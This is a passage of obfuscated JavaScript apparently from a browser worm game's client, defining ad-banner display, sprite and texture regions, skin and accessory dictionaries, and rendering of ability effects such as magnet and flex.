        var _0x3be0e7 = $("#" + _0x5b7bce);
        var _0x288c36 = _0x34b155;
        var _0x14796e = {};
        var _0xd0d879 = false;
        _0x14796e.ha = function () {
          if (!_0xd0d879) {
            _0x3be0e7.empty();
            _0x3be0e7.append("<div id='" + _0x288c36 + "'></div>");
            try {
              try {
                ga("send", "event", "banner", window.runtimeHash + "_display");
              } catch (_0x2ebde4) {}
              aiptag.cmd.display.push(function () {
                aipDisplayTag.display(_0x288c36);
              });
              _0xd0d879 = true;
            } catch (_0x2780f5) {}
          }
        };
        _0x14796e.ka = function () {
          try {
            try {
              ga("send", "event", "banner", window.runtimeHash + "_refresh");
            } catch (_0x2a3366) {}
            aiptag.cmd.display.push(function () {
              aipDisplayTag.display(_0x288c36);
            });
          } catch (_0x89725f) {}
        };
        return _0x14796e;
      };
      _0x1c97c7.la = function () {
        function _0x428cf9(_0x1e7548, _0x52af1a, _0x56621a, _0x4b41fa, _0x5ae980, _0x4efa11, _0x533e1e, _0x129dee, _0x43482a, _0x356cdc, _0x131375) {
          this.ma = _0x1e7548;
          this.na = _0x52af1a;
          this.oa = null;
          this.pa = false;
          this.qa = _0x56621a;
          this.ra = _0x4b41fa;
          this.sa = _0x5ae980;
          this.ta = _0x4efa11;
          this.ua = _0x533e1e || (_0x43482a || _0x5ae980) / 2;
          this.va = _0x129dee || (_0x356cdc || _0x4efa11) / 2;
          this.wa = _0x43482a || _0x5ae980;
          this.xa = _0x356cdc || _0x4efa11;
          this.ya = 0.5 - (this.ua - this.wa * 0.5) / this.sa;
          this.za = 0.5 - (this.va - this.xa * 0.5) / this.ta;
          this.Aa = this.sa / this.wa;
          if (_0x131375) {
            this.ev = _0x131375;
          } else {
            null;
          }
          this.Ba = this.ta / this.xa;
        }
        _0x428cf9.Ca = function () {
          return new _0x428cf9("", null, 0, 0, 0, 0, 0, 0, 0, 0);
        };
        _0x428cf9.Da = function (_0x5f4a6a, _0xddb4f6, _0x38bcee, _0xe15a93) {
          return new _0x428cf9(_0x5f4a6a, _0xddb4f6, _0x38bcee.x, _0x38bcee.y, _0x38bcee.w, _0x38bcee.h, _0x38bcee.px, _0x38bcee.py, _0x38bcee.pw, _0x38bcee.ph, _0xe15a93);
        };
        _0x428cf9.prototype.Ea = function () {
          if (this.pa) {
            return this.oa;
          }
          if (this.na != null) {
            this.oa = new _0x32defb.Texture(this.na, new _0x32defb.Rectangle(this.qa, this.ra, this.sa, this.ta));
          }
          this.pa = true;
          return this.oa;
        };
        _0x428cf9.prototype.Fa = function () {
          if (this.oa != null) {
            this.oa.destroy();
          }
        };
        return _0x428cf9;
      }();
      _0x1c97c7.Ga = function () {
        function _0x3eda90(_0x29c627, _0x59e472, _0x32c651, _0x3eb457, _0x3712ce, _0x35c9c2, _0x234dbd, _0x26e012, _0x3e1583, _0x266a3a, _0x52fd77, _0x34e229, _0x376037, _0x3cc70c, _0x3d3131, _0x163bc9, _0x51bc96, _0x103761) {
          this.Ha = _0x29c627;
          this.Ia = _0x59e472;
          this.Ja = _0x32c651;
          this.Ka = _0x3eb457;
          this.La = _0x3712ce;
          this.Ma = _0x35c9c2;
          this.Na = _0x234dbd;
          this.Oa = _0x26e012;
          this.Pa = _0x3e1583;
          this.Qa = _0x266a3a;
          this.Ra = _0x52fd77;
          this.Sa = _0x34e229;
          this.Ta = _0x376037;
          this.Ua = _0x3cc70c;
          this.Va = _0x3d3131;
          this.Wa = _0x163bc9;
          this.Xa = _0x51bc96;
          this.Ya = _0x103761;
        }
        _0x3eda90.prototype.Fa = function () {
          for (var _0x257141 = 0; _0x257141 < this.Ha.length; _0x257141++) {
            this.Ha[_0x257141].dispose();
            this.Ha[_0x257141].destroy();
          }
          this.Ha = [];
          for (var _0xa0280 = 0; _0xa0280 < this.Ia.length; _0xa0280++) {
            this.Ia[_0xa0280].Fa();
          }
          this.Ia = [];
        };
        _0x3eda90.Ca = function () {
          var _0x3695dd = new _0x3eda90.Za(_0x1c97c7._a.$a, _0x1c97c7._a.$a);
          var _0x43e0de = new _0x3eda90.ab("#ffffff", [_0x1c97c7._a.$a], [_0x1c97c7._a.$a]);
          return new _0x3eda90([], [], {}, _0x3695dd, {}, new _0x3eda90.bb(_0x1c97c7._a.$a), {}, _0x43e0de, {}, new _0x3eda90.cb("", _0x43e0de, _0x3695dd), {}, new _0x3eda90.db([_0x1c97c7._a.$a]), {}, new _0x3eda90.db([_0x1c97c7._a.$a]), {}, new _0x3eda90.db([_0x1c97c7._a.$a]), {}, new _0x3eda90.db([_0x1c97c7._a.$a]));
        };
        _0x3eda90.eb = function (_0x1d32ac, _0x5dfd64, _0x46af8d, _0x353be5) {
          var _0xb1770b = new _0x3eda90.Za(_0x1c97c7._a.$a, _0x1c97c7._a.$a);
          var _0x4f99c6 = new _0x3eda90.ab("#ffffff", [_0x1d32ac], [_0x5dfd64]);
          return new _0x3eda90([], [], {}, _0xb1770b, {}, new _0x3eda90.bb(_0x1c97c7._a.$a), {}, _0x4f99c6, {}, new _0x3eda90.cb("", _0x4f99c6, _0xb1770b), {}, new _0x3eda90.db([_0x46af8d]), {}, new _0x3eda90.db([_0x353be5]), {}, new _0x3eda90.db([_0x1c97c7._a.$a]), {}, new _0x3eda90.db([_0x1c97c7._a.$a]));
        };
        _0x3eda90.fb = function (_0x15f090, _0x433c0c, _0x4221bc, _0x246e49) {
          var _0x38c8e8 = {};
          _0x503ed4._(_0x15f090.colorDict, function (_0x50188d, _0x216fa9) {
            _0x38c8e8[_0x50188d] = "#" + _0x216fa9;
          });
          var _0x245353 = {};
          for (var _0x26dbdb = 0; _0x26dbdb < _0x15f090.skinArrayDict.length; _0x26dbdb++) {
            var _0x54b746 = _0x15f090.skinArrayDict[_0x26dbdb];
            _0x245353[_0x54b746.id] = new _0x3eda90.ab(_0x38c8e8[_0x54b746.prime], _0x54b746.base.map(function (_0x51d9cb) {
              return _0x433c0c[_0x51d9cb];
            }), _0x54b746.glow.map(function (_0x49464e, _0x1bd9fe) {
              return _0x433c0c[_0x49464e];
            }));
            if (_0x54b746.glow[0] == "a_trans") {
              _0x245353[_0x54b746.id].vbb = _0x433c0c.a_black;
            }
          }
          var _0x2f3339 = undefined;
          var _0x553c60 = _0x15f090.skinUnknown;
          try {
            _0x2f3339 = new _0x3eda90.ab(_0x38c8e8[_0x553c60.prime], _0x553c60.base.map(function (_0x2960c4) {
              return _0x433c0c[_0x2960c4];
            }), _0x553c60.glow.map(function (_0x20b5b5) {
              return _0x433c0c[_0x20b5b5];
            }));
          } catch (_0xb2d83d) {}
          var _0x1af2ee = {};
          _0x503ed4._(_0x15f090.eyesDict, function (_0x22e970, _0x1e891f) {
            var _0x59f381 = parseInt(_0x22e970);
            _0x1af2ee[_0x59f381] = new _0x3eda90.db(_0x1e891f.base.map(function (_0x440f6d) {
              return _0x433c0c[_0x440f6d.region];
            }));
          });
          var _0x297559 = new _0x3eda90.db(_0x15f090.eyesUnknown.base.map(function (_0xb88706) {
            return _0x433c0c[_0xb88706.region];
          }));
          var _0x5dc8fb = {};
          _0x503ed4._(_0x15f090.mouthDict, function (_0x3e401c, _0x3e4396) {
            var _0x4b7847 = parseInt(_0x3e401c);
            _0x5dc8fb[_0x4b7847] = new _0x3eda90.db(_0x3e4396.base.map(function (_0x581a95) {
              return _0x433c0c[_0x581a95.region];
            }));
          });
          var _0xcd5ad3 = new _0x3eda90.db(_0x15f090.mouthUnknown.base.map(function (_0xd0222e) {
            return _0x433c0c[_0xd0222e.region];
          }));
          var _0x51da3d = {};
          _0x503ed4._(_0x15f090.hatDict, function (_0x57ef60, _0x2ef13c) {
            var _0x490c6f = parseInt(_0x57ef60);
            _0x51da3d[_0x490c6f] = new _0x3eda90.db(_0x2ef13c.base.map(function (_0x5c7e7c) {
              return _0x433c0c[_0x5c7e7c.region];
            }));
          });
          var _0x3587aa = new _0x3eda90.db(_0x15f090.hatUnknown.base.map(function (_0x1cbc62) {
            return _0x433c0c[_0x1cbc62.region];
          }));
          var _0x48ea98 = {};
          _0x503ed4._(_0x15f090.glassesDict, function (_0xa03162, _0x56fd1f) {
            var _0x17e8eb = parseInt(_0xa03162);
            _0x48ea98[_0x17e8eb] = new _0x3eda90.db(_0x56fd1f.base.map(function (_0x164422) {
              return _0x433c0c[_0x164422.region];
            }));
          });
          var _0x315054 = new _0x3eda90.db(_0x15f090.glassesUnknown.base.map(function (_0x5946f8) {
            return _0x433c0c[_0x5946f8.region];
          }));
          var _0x2f3686 = {};
          _0x503ed4._(_0x15f090.portionDict, function (_0x23e0b1, _0x1404f5) {
            _0x23e0b1 = parseInt(_0x23e0b1);
            _0x2f3686[_0x23e0b1] = new _0x3eda90.Za(_0x433c0c[_0x1404f5.base], _0x433c0c[_0x1404f5.glow]);
          });
          var _0x18658e = undefined;
          var _0x16c3df = _0x15f090.portionUnknown;
          _0x18658e = new _0x3eda90.Za(_0x433c0c[_0x16c3df.base], _0x433c0c[_0x16c3df.glow]);
          var _0x56626e = {};
          _0x503ed4._(_0x15f090.abilityDict, function (_0x248974, _0x5e8dc1) {
            _0x248974 = parseInt(_0x248974);
            _0x56626e[_0x248974] = new _0x3eda90.bb(_0x433c0c[_0x5e8dc1.base]);
          });
          var _0x4e3870 = undefined;
          var _0x581d4e = _0x15f090.abilityUnknown;
          _0x4e3870 = new _0x3eda90.bb(_0x433c0c[_0x581d4e.base]);
          var _0x27d6b4 = {};
          _0x503ed4._(_0x15f090.teamDict, function (_0x3f47a4, _0x2f60da) {
            _0x3f47a4 = parseInt(_0x3f47a4);
            _0x27d6b4[_0x3f47a4] = new _0x3eda90.cb(_0x2f60da.title, new _0x3eda90.ab(_0x38c8e8[_0x2f60da.skin.prime], null, _0x2f60da.skin.glow.map(function (_0x1a03c8) {
              return _0x433c0c[_0x1a03c8];
            })), new _0x3eda90.Za(null, _0x433c0c[_0x2f60da.portion.glow]));
          });
          var _0x147093 = new _0x3eda90.cb({}, _0x2f3339, _0x18658e);
          return new _0x3eda90(_0x4221bc, _0x246e49, _0x2f3686, _0x18658e, _0x56626e, _0x4e3870, _0x245353, _0x2f3339, _0x27d6b4, _0x147093, _0x1af2ee, _0x297559, _0x5dc8fb, _0xcd5ad3, _0x51da3d, _0x3587aa, _0x48ea98, _0x315054);
        };
        _0x3eda90.prototype.gb = function (_0x341d43) {
          var _0x5f174c = _0x503ed4.aa(Object.keys(this.Na)).slice(0, _0x341d43);
          var _0x2da092 = _0x503ed4.aa(Object.keys(this.Ra)).slice(0, _0x341d43);
          var _0x1918e3 = _0x503ed4.aa(Object.keys(this.Ta)).slice(0, _0x341d43);
          var _0x5e4a14 = _0x503ed4.aa(Object.keys(this.Va)).slice(0, _0x341d43);
          var _0x48db45 = _0x503ed4.aa(Object.keys(this.Xa)).slice(0, _0x341d43);
          var _0x3fd0fe = [];
          for (var _0x2e7aa7 = 0; _0x2e7aa7 < _0x341d43; _0x2e7aa7++) {
            var _0x39ed1c = _0x5f174c.length > 0 ? _0x5f174c[_0x2e7aa7 % _0x5f174c.length] : 0;
            var _0x409733 = _0x2da092.length > 0 ? _0x2da092[_0x2e7aa7 % _0x2da092.length] : 0;
            var _0x332e58 = _0x1918e3.length > 0 ? _0x1918e3[_0x2e7aa7 % _0x1918e3.length] : 0;
            var _0x480309 = _0x5e4a14.length > 0 ? _0x5e4a14[_0x2e7aa7 % _0x5e4a14.length] : 0;
            var _0x2ffd7d = _0x48db45.length > 0 ? _0x48db45[_0x2e7aa7 % _0x48db45.length] : 0;
            _0x3fd0fe.push(new _0x1c97c7.hb(_0x39ed1c, _0x409733, _0x332e58, _0x480309, _0x2ffd7d));
          }
          return _0x3fd0fe;
        };
        _0x3eda90.prototype.ib = function (_0x40cb4b) {
          if (this.Na.hasOwnProperty(_0x40cb4b)) {
            return this.Na[_0x40cb4b];
          } else {
            return this.Oa;
          }
        };
        _0x3eda90.prototype.jb = function (_0x2d0a06) {
          if (this.Pa.hasOwnProperty(_0x2d0a06)) {
            return this.Pa[_0x2d0a06];
          } else {
            return this.Qa;
          }
        };
        _0x3eda90.prototype.kb = function (_0x368e4c) {
          if (this.Ra.hasOwnProperty(_0x368e4c)) {
            return this.Ra[_0x368e4c];
          } else {
            return this.Sa;
          }
        };
        _0x3eda90.prototype.lb = function (_0x2905fb) {
          if (this.Ta.hasOwnProperty(_0x2905fb)) {
            return this.Ta[_0x2905fb];
          } else {
            return this.Ua;
          }
        };
        _0x3eda90.prototype.mb = function (_0x67c72c) {
          if (this.Xa.hasOwnProperty(_0x67c72c)) {
            return this.Xa[_0x67c72c];
          } else {
            return this.Ya;
          }
        };
        _0x3eda90.prototype.nb = function (_0x4c9d37) {
          if (this.Va.hasOwnProperty(_0x4c9d37)) {
            return this.Va[_0x4c9d37];
          } else {
            return this.Wa;
          }
        };
        _0x3eda90.prototype.ob = function (_0x6d5542) {
          if (this.Ja.hasOwnProperty(_0x6d5542)) {
            return this.Ja[_0x6d5542];
          } else {
            return this.Ka;
          }
        };
        _0x3eda90.prototype.pb = function (_0x1629fa) {
          if (this.La.hasOwnProperty(_0x1629fa)) {
            return this.La[_0x1629fa];
          } else {
            return this.Ma;
          }
        };
        _0x3eda90.cb = function () {
          function _0x25f186(_0x4e8b93, _0x12a09d, _0xff13d8) {
            this.qb = _0x4e8b93;
            this.rb = _0x12a09d;
            this.sb = _0xff13d8;
          }
          return _0x25f186;
        }();
        _0x3eda90.ab = function () {
          function _0x219e95(_0x23827e, _0xde96e4, _0x42d722) {
            this.tb = _0x23827e;
            this.ub = _0xde96e4;
            this.vb = _0x42d722;
          }
          return _0x219e95;
        }();
        _0x3eda90.db = function () {
          function _0x4c6b5a(_0x5c6eb6) {
            this.ub = _0x5c6eb6;
          }
          return _0x4c6b5a;
        }();
        _0x3eda90.Za = function () {
          function _0xdd6da2(_0x5eb344, _0x39bdec) {
            this.ub = _0x5eb344;
            this.vb = _0x39bdec;
          }
          return _0xdd6da2;
        }();
        _0x3eda90.bb = function () {
          function _0x1fd509(_0x278996) {
            this.ub = _0x278996;
          }
          return _0x1fd509;
        }();
        return _0x3eda90;
      }();
      _0x1c97c7._a = function () {
        function _0x182d6b() {
          var _0x1a5de4 = _0x32defb.BaseTexture.from("/images/wear-ability.png");
          this.wb = new _0x1c97c7.la("magnet_ability", _0x1a5de4, 158, 86, 67, 124, 148, 63.5, 128, 128);
          this.xb = new _0x1c97c7.la("velocity_ability", _0x1a5de4, 158, 4, 87, 74, 203, 63.5, 128, 128);
          this.yb = new _0x1c97c7.la("flex_ability", _0x1a5de4, 4, 4, 146, 146, 63.5, 63.5, 128, 128);
          var _0x3a78e0 = _0x32defb.BaseTexture.from(atob(savedImages[35]));
          this.pwrFlex1 = new _0x1c97c7.la("flex_ability", _0x3a78e0, 158, 4, 87, 74, 203, 63.5, 128, 128);
          var _0x166409 = _0x32defb.BaseTexture.from(atob(savedImages[68]));
          this.pwrFlex2 = new _0x1c97c7.la("flex_ability", _0x166409, 156, 140, 87, 60, 170, 128.5, 128, 128);
          this.pwrFlex3 = new _0x1c97c7.la("flex_ability", _0x166409, 156, 4, 87, 74, 285, 63.5, 128, 128);
          var _0x31e709 = _0x32defb.BaseTexture.from("/images/def-look.png");
          var _0x353d95 = new _0x1c97c7.la("def_eyes", _0x31e709, 0, 0, 42, 80, 75, 64, 128, 128);
          var _0x402e79 = new _0x1c97c7.la("def_mouth", _0x31e709, 46, 0, 20, 48, 109, 63, 128, 128);
          var _0x3737f2 = new _0x1c97c7.la("def_skin_glow", _0x31e709, 70, 0, 32, 32, 0, 0, 0, 0);
          var _0x3c0487 = new _0x1c97c7.la("def_skin_base", _0x31e709, 46, 52, 64, 64, 0, 0, 0, 0);
          var _0x4271ca = _0x1c97c7.Ga.eb(_0x3c0487, _0x3737f2, _0x353d95, _0x402e79);
          _wup.mySkin = _0x4271ca;
          this.zb = new _0x1c97c7.Ab({}, _0x4271ca);
          this.Bb = -10000;
          this.Cb = -10000;
          this.Db = function () {
            var _0x1f6c75 = window.document.createElement("canvas");
            _0x1f6c75.width = 80;
            _0x1f6c75.height = 80;
            return {
              Eb: _0x1f6c75,
              Fb: _0x1f6c75.getContext("2d"),
              oa: new _0x32defb.Texture(_0x32defb.BaseTexture.from(_0x1f6c75))
            };
          }();
          this.Gb = null;
          this.Hb = [];
        }
        _0x182d6b.$a = _0x1c97c7.la.Ca();
        _0x182d6b.prototype.ha = function () {};
        _0x182d6b.prototype.Ib = function (_0x8f5812, _0x1d09e4, _0x5b4abb) {
          var _0x5b67bd = this;
          var _0x1bdb21 = this.zb.Jb();
          if (_0x1bdb21 > 0 && Date.now() - this.Bb < 1200000) {
            if (_0x8f5812 != null) {
              _0x8f5812();
            }
            return;
          }
          if (this.Gb != null && !this.Gb.Kb()) {
            if (Date.now() - this.Bb < 300000) {
              if (_0x8f5812 != null) {
                _0x8f5812();
              }
              return;
            }
            this.Gb.Lb();
            this.Gb = null;
          }
          var _0x539724 = new _0x1c97c7.Mb(_0x1bdb21);
          _0x539724.Nb(function (_0xe98aaf, _0x3619c5) {
            if (_0x539724 === _0x5b67bd.Gb && _0x5b4abb != null) {
              _0x5b4abb(_0xe98aaf, _0x3619c5);
            }
          });
          _0x539724.Ob(function (_0x47fbd8) {
            if (_0x539724 === _0x5b67bd.Gb && _0x1d09e4 != null) {
              _0x1d09e4(_0x47fbd8);
            }
          });
          _0x539724.Pb(function () {
            if (_0x539724 === _0x5b67bd.Gb && _0x1d09e4 != null) {
              _0x1d09e4(new Error());
            }
          });
          _0x539724.Qb(function () {
            if (_0x539724 === _0x5b67bd.Gb && _0x8f5812 != null) {
              _0x8f5812();
            }
          });
          _0x539724.Rb(function (_0x2daa18) {
            if (_0x539724 === _0x5b67bd.Gb) {
              _0x5b67bd.Cb = Date.now();
              _0x5b67bd.Gb = null;
              _0x5b67bd.Sb();
              _0x5b67bd.zb.Ub().Fa();
              _0x5b67bd.zb = _0x2daa18;
              if (_0x8f5812 != null) {
                _0x8f5812();
              }
              _0x5b67bd.Tb();
              return;
            }
            try {
              _0x2daa18.Ub().Fa();
            } catch (_0x58e9a6) {}
          });
          _0x539724.Vb();
          this.Bb = Date.now();
          this.Gb = _0x539724;
        };
        _0x182d6b.prototype.Sb = function () {};
        _0x182d6b.prototype.Wb = function () {
          return this.zb.Jb() > 0;
        };
        _0x182d6b.prototype.Xb = function () {
          return this.zb.Yb();
        };
        _0x182d6b.prototype.Zb = function () {
          return this.Db;
        };
        _0x182d6b.prototype.$b = function (_0x2c2d83) {
          this.Hb.push(_0x2c2d83);
        };
        _0x182d6b.prototype.Tb = function () {
          for (var _0x557d5c = 0; _0x557d5c < this.Hb.length; _0x557d5c++) {
            this.Hb[_0x557d5c]();
          }
        };
        _0x182d6b.prototype.Ub = function () {
          return this.zb.Ub();
        };
        return _0x182d6b;
      }();
      _0x1c97c7._b = function () {
        function _0xcec2a8(_0x1ee0f4) {
          this.ac = _0x1ee0f4;
        }
        _0xcec2a8.prototype.bc = function (_0x516ece) {
          return this.ac[_0x516ece];
        };
        _0xcec2a8.cc = function () {
          function _0x19ce93() {
            this.dc = [];
          }
          _0x19ce93.prototype.ec = function (_0x2fbf04, _0x3f6aab) {
            for (var _0x5e3e25 = 0; _0x5e3e25 < this.dc.length; _0x5e3e25++) {
              if (this.dc[_0x5e3e25].fc === _0x2fbf04) {
                throw new Error();
              }
            }
            this.dc.push(new _0xcec2a8.gc(_0x2fbf04, _0x3f6aab));
            return this;
          };
          _0x19ce93.prototype.hc = function () {
            var _0x44093a = 0;
            for (var _0x96aaae = 0; _0x96aaae < this.dc.length; _0x96aaae++) {
              _0x44093a += this.dc[_0x96aaae].ic;
            }
            var _0x3fe0f8 = {};
            var _0x32e8fc = 0;
            for (var _0x5d83d5 = 0; _0x5d83d5 < this.dc.length; _0x5d83d5++) {
              var _0x5658e2 = this.dc[_0x5d83d5];
              _0x5658e2.ic = _0x5658e2.ic / _0x44093a;
              _0x5658e2.jc = _0x32e8fc;
              _0x5658e2.kc = _0x32e8fc + _0x5658e2.ic;
              _0x32e8fc = _0x5658e2.kc;
              _0x3fe0f8[_0x5658e2.fc] = _0x5658e2;
            }
            return new _0xcec2a8(_0x3fe0f8);
          };
          return _0x19ce93;
        }();
        _0xcec2a8.gc = function () {
          function _0x4dcabf(_0x5efca5, _0x279ff5) {
            this.fc = _0x5efca5;
            this.ic = _0x279ff5;
            this.jc = 0;
            this.kc = 0;
          }
          _0x4dcabf.prototype.lc = function (_0xc888a4) {
            return this.jc + (this.kc - this.jc) * _0xc888a4;
          };
          return _0x4dcabf;
        }();
        return _0xcec2a8;
      }();
      _0x1c97c7.WormSpriteTree = function () {
        function _0x3c26e1() {
          this.nc = new _0x32defb.Container();
          this.nc.sortableChildren = true;
          this.oc = new _0x57bbe3();
          this.oc.zIndex = _0x28cf7f * ((_0x4fe488 + 1) * 2 + 1 + 3);
          this.pc = 0;
          this.qc = new Array(_0x4fe488);
          this.qc[0] = this.rc(0, new _0x1c97c7.sc(), new _0x1c97c7.sc());
          for (var _0x2737b7 = 1; _0x2737b7 < _0x4fe488; _0x2737b7++) {
            this.qc[_0x2737b7] = this.rc(_0x2737b7, new _0x1c97c7.sc(), new _0x1c97c7.sc());
          }
          this.tc = 0;
          this.uc = 0;
          this.vc = 0;
        }
        var _0x28cf7f = 0.001;
        var _0x4fe488 = 797;
        var _0x164383 = -0.06640625;
        var _0x5c2088 = 0.84375;
        var _0x519c3a = 0.2578125;
        var _0x4f7399 = -0.03515625;
        var _0x2fe320 = -0.0625;
        var _0x17a1dc = 0.5625;
        var _0x22e5a9 = _0x164383 * 3 + _0x5c2088;
        var _0xffde87 = _0x519c3a - _0x164383 * 3;
        var _0x33bf66 = _0x164383 + _0x4f7399;
        var _0x12dc3a = 0.375;
        var _0xe52042 = 0.75;
        var _0xccca93 = _0x2fe320 + _0x2fe320;
        var _0x9b7e4d = _0x4f7399 * 3 + _0x519c3a;
        var _0x2a3627 = _0x5c2088 - _0x4f7399 * 3;
        var _0x4ec270 = _0x4f7399 + _0x164383;
        _0x3c26e1.wc = _0x4fe488;
        _0x3c26e1.prototype.rc = function (_0x4ba1c7, _0xaf86dd, _0x484e24) {
          var _0x1f6a45 = new _0x25d4d2(_0xaf86dd, _0x484e24);
          _0xaf86dd.xc.zIndex = _0x28cf7f * ((_0x4fe488 - _0x4ba1c7) * 2 + 1 + 3);
          _0x484e24.xc.zIndex = _0x28cf7f * ((_0x4fe488 - _0x4ba1c7) * 2 - 2 + 3);
          return _0x1f6a45;
        };
        _0x3c26e1.prototype.yc = function (_0x40715d, _0x1d74de, _0x523696, _0x2960bf, _0x526198, _0xf53f40, _0x55f207, _0x2badc3) {
          var _0xafbc36 = _0x523696.ub;
          var _0x18b5a7 = _0x40715d === _0x1c97c7.Ac.zc ? _0x1d74de.rb.vb : _0x523696.vb;
          if (_0xafbc36.length > 0 && _0x18b5a7.length > 0) {
            for (var _0xa664e3 = 0; _0xa664e3 < this.qc.length; _0xa664e3++) {
              this.qc[_0xa664e3].Cc.Bc(_0xafbc36[_0xa664e3 % _0xafbc36.length], _0xa664e3 % _0xafbc36.length, _0xa664e3);
              this.qc[_0xa664e3].Dc.Bc(_0xa664e3 == 0 && _0x523696.vbb ? _0x523696.vbb : _0x18b5a7[_0xa664e3 % _0x18b5a7.length], _0xa664e3 % _0xafbc36.length, _0xa664e3);
              this.qc[_0xa664e3].Cc.Ec(_0x2badc3);
              this.qc[_0xa664e3].Dc.Ec(_0x2badc3);
            }
          }
          this.oc.yc(_0x2960bf, _0x526198, _0xf53f40, _0x55f207);
        };
        var _0x57bbe3 = function () {
          var _0x1e37ae = _0x503ed4.M(_0x32defb.Container, function () {
            _0x32defb.Container.call(this);
            this.sortableChildren = true;
            this.Fc = [];
            this.Gc = [];
            this.Hc = [];
            this.Ic = [];
            this.Jc = new _0x32defb.Container();
            this.Kc = [];
            this.message = new _0x32defb.Container();
            for (var _0x12f387 = 0; _0x12f387 < 4; _0x12f387++) {
              var _0xcd1a42 = new _0x1c97c7.sc();
              _0xcd1a42.Bc(_0xf1d21a().Lc.wb);
              this.Jc.addChild(_0xcd1a42.xc);
              this.Kc.push(_0xcd1a42);
            }
            this.message.zIndex = 0.0012;
            this.addChild(this.message);
            this.VcUn();
            this.Jc.zIndex = 0.0011;
            this.addChild(this.Jc);
            this.Mc();
            this.Nc = new _0x1c97c7.sc();
            this.Nc.Bc(_0xf1d21a().Lc.xb);
            this.Nc.xc.zIndex = 0.001;
            this.addChild(this.Nc.xc);
            this.Oc();
            this.pwr_flex1 = new _0x1c97c7.sc();
            this.pwr_flex1.Bc(_0xf1d21a().Lc.pwrFlex1);
            this.pwr_flex1.xc.zIndex = 0.002;
            this.addChild(this.pwr_flex1.xc);
            this.pwr_flex2 = new _0x1c97c7.sc();
            this.pwr_flex2.Bc(_0xf1d21a().Lc.pwrFlex2);
            this.pwr_flex2.xc.zIndex = 0.001;
            this.addChild(this.pwr_flex2.xc);
            this.pwr_flex3 = new _0x1c97c7.sc();
            this.pwr_flex3.Bc(_0xf1d21a().Lc.pwrFlex3);
            this.pwr_flex3.xc.zIndex = 0.001;
            this.addChild(this.pwr_flex3.xc);
            this.disableFlex();
          });
          _0x1e37ae.prototype.yc = function (_0x211d13, _0x2ccf77, _0x4bbd3f, _0x408527) {
            this.Pc(0.002, this.Fc, _0x211d13.ub);
            this.Pc(0.003, this.Gc, _0x2ccf77.ub);
            this.Pc(0.004, this.Ic, _0x408527.ub);
            this.Pc(0.005, this.Hc, _0x4bbd3f.ub);
          };
          _0x1e37ae.prototype.Pc = function (_0x7974ef, _0x3ddcee, _0x418fcb) {
            while (_0x418fcb.length > _0x3ddcee.length) {
              var _0x485280 = new _0x1c97c7.sc();
              _0x3ddcee.push(_0x485280);
              this.addChild(_0x485280.Qc());
            }
            while (_0x418fcb.length < _0x3ddcee.length) {
              _0x3ddcee.pop().Rc();
            }
            var _0x578454 = _0x7974ef;
            for (var _0x867aae = 0; _0x867aae < _0x418fcb.length; _0x867aae++) {
              _0x578454 += 0.0001;
              var _0x581ab7 = _0x3ddcee[_0x867aae];
              _0x581ab7.Bc(_0x418fcb[_0x867aae]);
              _0x581ab7.xc.zIndex = _0x578454;
            }
          };
          _0x1e37ae.prototype.Sc = function (_0x15b39c, _0x42bfb6, _0x15d39c, _0x1cbe6c) {
            this.visible = true;
            this.position.set(_0x15b39c, _0x42bfb6);
            this.rotation = _0x1cbe6c;
            for (var _0x2a7fa8 = 0; _0x2a7fa8 < this.Fc.length; _0x2a7fa8++) {
              this.Fc[_0x2a7fa8].Tc(_0x15d39c);
            }
            for (var _0x3713a0 = 0; _0x3713a0 < this.Gc.length; _0x3713a0++) {
              this.Gc[_0x3713a0].Tc(_0x15d39c);
            }
            for (var _0x252792 = 0; _0x252792 < this.Hc.length; _0x252792++) {
              this.Hc[_0x252792].Tc(_0x15d39c);
            }
            for (var _0x52f113 = 0; _0x52f113 < this.Ic.length; _0x52f113++) {
              this.Ic[_0x52f113].Tc(_0x15d39c);
            }
          };
          _0x1e37ae.prototype.Uc = function () {
            this.visible = false;
          };
          _0x1e37ae.prototype.VcAc = function (_0x2fd93d, _0x510985, _0x3ebe6b, _0x41f741, _0x4e280a) {
            this.message.visible = true;
            this.Mc2.Tc(_0x510985);
          };
          _0x1e37ae.prototype.VcUn = function () {
            this.message.visible = false;
          };
          _0x1e37ae.prototype.Vc = function (_0xcdb282, _0xdf0a88, _0x4293f4, _0x34eed8) {
            this.Jc.visible = true;
            var _0xb92d88 = _0x4293f4 / 1000;
            var _0x5adeb1 = 1 / this.Kc.length;
            for (var _0x54b304 = 0; _0x54b304 < this.Kc.length; _0x54b304++) {
              var _0x37caee = 1 - (_0xb92d88 + _0x5adeb1 * _0x54b304) % 1;
              this.Kc[_0x54b304].xc.alpha = 1 - _0x37caee;
              this.Kc[_0x54b304].Tc(_0xdf0a88 * (0.5 + _0x37caee * 4.5));
            }
          };
          _0x1e37ae.prototype.Mc = function () {
            this.Jc.visible = false;
          };
          _0x1e37ae.prototype.Wc = function (_0x59ad41, _0x40e1be, _0x56a7c4, _0x21ac79) {
            this.Nc.xc.visible = window.vps.vp;
            this.Nc.xc.alpha = _0x503ed4.Q(this.Nc.xc.alpha, _0x59ad41.Xc ? 0.9 : 0.4, _0x21ac79, 0.0025);
            this.Nc.Tc(_0x40e1be);
          };
          _0x1e37ae.prototype.xd = function () {
            this.Nc.xc.visible = false;
          };
          _0x1e37ae.prototype.activeFlex = function (_0x17b4d1, _0xf92d8b, _0xaa299d, _0x2478a0) {
            this.pwr_flex1.xc.visible = window.vps.flx === 1;
            this.pwr_flex1.xc.alpha = _0x503ed4.Q(this.Nc.xc.alpha, _0x17b4d1.Xc ? 1 : 1, _0x2478a0, 1);
            this.pwr_flex1.Tc(_0xf92d8b);
            this.pwr_flex2.xc.visible = window.vps.flx === 2;
            this.pwr_flex2.xc.alpha = _0x503ed4.Q(this.Nc.xc.alpha, _0x17b4d1.Xc ? 0.9 : 0.4, _0x2478a0, 0.0025);
            this.pwr_flex2.Tc(_0xf92d8b);
            this.pwr_flex3.xc.visible = window.vps.flx === 3;
            this.pwr_flex3.xc.alpha = _0x503ed4.Q(this.Nc.xc.alpha, _0x17b4d1.Xc ? 0.9 : 0.4, _0x2478a0, 0.0025);
            this.pwr_flex3.Tc(_0xf92d8b);
          };
          _0x1e37ae.prototype.disableFlex = function () {
            this.pwr_flex1.xc.visible = false;
            this.pwr_flex2.xc.visible = false;
            this.pwr_flex3.xc.visible = false;
          };
          _0x1e37ae.prototype.WXX = function (_0xdeee03, _0x571b6a, _0x47a0f5, _0x1524c9) {
            this.Nc.xc.visible = true;
